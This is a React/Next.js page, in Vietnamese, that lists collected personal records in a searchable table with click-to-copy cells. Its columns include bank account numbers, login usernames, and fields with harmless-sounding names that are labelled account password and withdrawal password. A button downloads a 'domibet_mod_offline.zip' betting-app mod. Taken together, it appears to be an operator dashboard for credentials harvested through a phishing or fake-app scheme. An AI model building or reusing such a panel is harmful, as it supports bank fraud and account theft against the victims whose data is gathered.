"use client";

import { useEffect, useMemo, useState } from "react";

// Kiểu dữ liệu trả về từ API
type RecordItem = {
  hoVaTen: string;
  soTaiKhoan: string;
  tenNganHang: string;
  chiNhanh: string;
  tenDangNhap: string;
  nickname: string;
  soPhien: string;
  soDienThoai: string;
  email: string;
  ngaySinh: string; // "YYYY/MM/DD"
  rawData: string;
  createdAt: string; // ISO
};

type SortState = { key: keyof RecordItem | ""; direction: "asc" | "desc" };

export default function Home() {
  const [data, setData] = useState<RecordItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [err, setErr] = useState<string | null>(null);
  const [q, setQ] = useState("");
  const [sort, setSort] = useState<SortState>({ key: "", direction: "asc" });
  const [copied, setCopied] = useState<string>("");

  async function fetchData() {
    try {
      setLoading(true);
      setErr(null);
      const res = await fetch("/api/records", { cache: "no-store" });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const json = await res.json();
      console.log("API response:", json.data);
      // API có thể trả object đơn lẻ hoặc mảng -> chuẩn hoá thành mảng
      const arr: RecordItem[] = Array.isArray(json.data)
        ? json.data
        : [json.data];
      setData(arr);
      console.log("Fetched records:", arr);
    } catch (e: any) {
      setErr(e?.message || "Fetch failed");
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    fetchData();
  }, []);

  // Tìm kiếm toàn văn (không phân biệt hoa/thường) trên tất cả field string
  const filtered = useMemo(() => {
    const term = q.trim().toLowerCase();
    if (!term) return data;
    return data.filter((item) =>
      Object.values(item).some((v) =>
        String(v ?? "")
          .toLowerCase()
          .includes(term)
      )
    );
  }, [data, q]);

  // Sắp xếp theo cột
  const sorted = useMemo(() => {
    if (!sort.key) return filtered;
    const { key, direction } = sort;
    return [...filtered].sort((a, b) => {
      const va = String(a[key] ?? "");
      const vb = String(b[key] ?? "");
      // Nếu là createdAt thì so sánh thời gian
      if (key === "createdAt") {
        const ta = new Date(va).getTime();
        const tb = new Date(vb).getTime();
        return direction === "asc" ? ta - tb : tb - ta;
      }
      // Nếu là ngaySinh ("YYYY/MM/DD") thì so sánh theo chuỗi là ổn (đã chuẩn hoá)
      if (key === "ngaySinh") {
        return direction === "asc"
          ? va.localeCompare(vb)
          : vb.localeCompare(va);
      }
      // Mặc định so sánh chữ
      return direction === "asc" ? va.localeCompare(vb) : vb.localeCompare(va);
    });
  }, [filtered, sort]);

  function toggleSort(key: keyof RecordItem) {
    setSort((prev) => {
      if (prev.key !== key) return { key, direction: "asc" };
      return { key, direction: prev.direction === "asc" ? "desc" : "asc" };
    });
  }

  async function copyText(text: string) {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(text);
      setTimeout(() => setCopied(""), 1200);
    } catch {
      // ignore
    }
  }

  function caretFor(col: keyof RecordItem) {
    if (sort.key !== col) return "↕";
    return sort.direction === "asc" ? "↑" : "↓";
  }

  function fmtDateISO(iso: string) {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return iso;
    // dd/MM/yyyy HH:mm
    const dd = String(d.getDate()).padStart(2, "0");
    const mm = String(d.getMonth() + 1).padStart(2, "0");
    const yyyy = d.getFullYear();
    const hh = String(d.getHours()).padStart(2, "0");
    const mi = String(d.getMinutes()).padStart(2, "0");
    return `${dd}/${mm}/${yyyy} ${hh}:${mi}`;
  }
  const startDownload = () => {
    const link = document.createElement("a");
    link.href = "/V2.zip"; // file trong /public/data.zip
    link.download = "domibet_mod_offline.zip"; // tên file khi tải về
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  const columns: { key: keyof RecordItem; label: string }[] = [
    { key: "hoVaTen", label: "Họ và tên" },
    { key: "soTaiKhoan", label: "Số tài khoản" },
    { key: "tenNganHang", label: "Ngân hàng" },
    { key: "chiNhanh", label: "Chi nhánh" },
    { key: "tenDangNhap", label: "Tên đăng nhập" },
    { key: "nickname", label: "Mật khẩu" },
    { key: "soPhien", label: "Mật khẩu rút tiền" },
    { key: "soDienThoai", label: "SĐT" },
    { key: "email", label: "Email" },
    { key: "ngaySinh", label: "Ngày sinh" },
    { key: "createdAt", label: "Tạo lúc" },
  ];

  return (
    <div className="min-h-screen p-4 sm:p-6 lg:p-8 bg-gradient-to-b from-white to-gray-50 dark:from-black dark:to-neutral-950 text-foreground">
      <div className="mx-auto w-full max-w-7xl space-y-6">
        {/* Header */}
        <header className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
          <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">
            📋 Danh sách Records
          </h1>
          <div className="flex gap-2">
            <button
              onClick={fetchData}
              className="h-10 px-4 rounded-lg border border-neutral-200 dark:border-neutral-800 bg-white dark:bg-neutral-900 hover:bg-neutral-50 dark:hover:bg-neutral-800 transition font-medium"
            >
              Làm mới
            </button>
            <button
              onClick={startDownload}
              className="h-10 px-4 rounded-lg border border-neutral-200 dark:border-neutral-800 bg-white dark:bg-neutral-900 hover:bg-neutral-50 dark:hover:bg-neutral-800 transition font-medium"
            >
              Tải bản mới
            </button>
          </div>
        </header>

        {/* Toolbar */}
        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <div className="relative w-full sm:max-w-md">
            <input
              value={q}
              onChange={(e) => setQ(e.target.value)}
              placeholder="Tìm kiếm: tên, STK, ngân hàng, SĐT, email..."
              className="w-full h-11 rounded-xl border border-neutral-200 dark:border-neutral-800 bg-white/80 dark:bg-neutral-900/80 backdrop-blur px-4 pr-10 outline-none focus:ring-2 ring-blue-500/50 transition"
            />
            <span className="absolute right-3 top-1/2 -translate-y-1/2 text-neutral-400">
              ⌘K
            </span>
          </div>

          <div className="text-sm text-neutral-500">
            {loading
              ? "Đang tải…"
              : `${sorted.length} bản ghi${
                  q ? ` (lọc từ ${data.length})` : ""
                }`}
          </div>
        </div>

        {/* Error */}
        {err && (
          <div className="rounded-xl border border-red-300/40 bg-red-50 dark:bg-red-950/30 text-red-700 dark:text-red-200 p-4">
            Lỗi tải dữ liệu: {err}
          </div>
        )}

        {/* Table (scrollable on mobile) */}
        <div className="overflow-x-auto rounded-2xl border border-neutral-200 dark:border-neutral-800 bg-white dark:bg-neutral-900 shadow-sm">
          <table className="min-w-[900px] w-full text-sm">
            <thead className="bg-neutral-100/60 dark:bg-neutral-800/60">
              <tr className="text-left">
                {columns.map((c) => (
                  <th
                    key={String(c.key)}
                    onClick={() => toggleSort(c.key)}
                    title="Nhấn để sắp xếp"
                    className="px-4 py-3 font-semibold select-none cursor-pointer whitespace-nowrap"
                  >
                    <span className="inline-flex items-center gap-1">
                      {c.label}
                      <span className="text-neutral-400">
                        {caretFor(c.key)}
                      </span>
                    </span>
                  </th>
                ))}
                <th className="px-4 py-3 font-semibold whitespace-nowrap">
                  Raw
                </th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr>
                  <td
                    colSpan={columns.length + 1}
                    className="px-4 py-8 text-center"
                  >
                    <span className="animate-pulse text-neutral-500">
                      Đang tải dữ liệu…
                    </span>
                  </td>
                </tr>
              ) : sorted.length === 0 ? (
                <tr>
                  <td
                    colSpan={columns.length + 1}
                    className="px-4 py-10 text-center text-neutral-500"
                  >
                    Không có dữ liệu.
                  </td>
                </tr>
              ) : (
                sorted.map((item, idx) => (
                  <tr
                    key={idx}
                    className="border-t border-neutral-100 dark:border-neutral-800 hover:bg-neutral-50/80 dark:hover:bg-neutral-800/40 transition"
                  >
                    {/* Mỗi ô có onClick -> copy nội dung cột */}
                    <TdCopy onCopy={copyText} text={item.hoVaTen} />
                    <TdCopy onCopy={copyText} text={item.soTaiKhoan} />
                    <TdCopy onCopy={copyText} text={item.tenNganHang} />
                    <TdCopy onCopy={copyText} text={item.chiNhanh} />
                    <TdCopy onCopy={copyText} text={item.tenDangNhap} />
                    <TdCopy onCopy={copyText} text={item.nickname} />
                    <TdCopy onCopy={copyText} text={item.soPhien} />
                    <TdCopy onCopy={copyText} text={item.soDienThoai} />
                    <TdCopy onCopy={copyText} text={item.email} />
                    <TdCopy onCopy={copyText} text={item.ngaySinh} />
                    <td
                      className="px-4 py-3 whitespace-nowrap"
                      title={item.createdAt}
                      onClick={() => copyText(item.createdAt)}
                    >
                      {fmtDateISO(item.createdAt)}
                    </td>
                    <TdCopy
                      onCopy={copyText}
                      text={item.rawData}
                      className="max-w-[260px] truncate"
                    />
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>

        {/* Hint */}
        <p className="text-xs text-neutral-500">
          Mẹo: Nhấn vào bất kỳ ô nào để{" "}
          <span className="font-semibold">copy</span> nhanh nội dung ô đó.
        </p>
      </div>

      {/* Toast copy */}
      {copied && (
        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 z-50">
          <div className="px-4 py-2 rounded-full bg-neutral-900 text-white text-sm shadow-lg">
            Đã copy: <span className="font-mono">{copied}</span>
          </div>
        </div>
      )}
    </div>
  );
}

// Ô bảng có chức năng copy
function TdCopy({
  text,
  onCopy,
  className = "",
}: {
  text: string;
  onCopy: (t: string) => void;
  className?: string;
}) {
  return (
    <td
      className={`px-4 py-3 whitespace-nowrap cursor-copy ${className}`}
      title="Nhấn để copy"
      onClick={() => onCopy(text)}
    >
      {text}
    </td>
  );
}
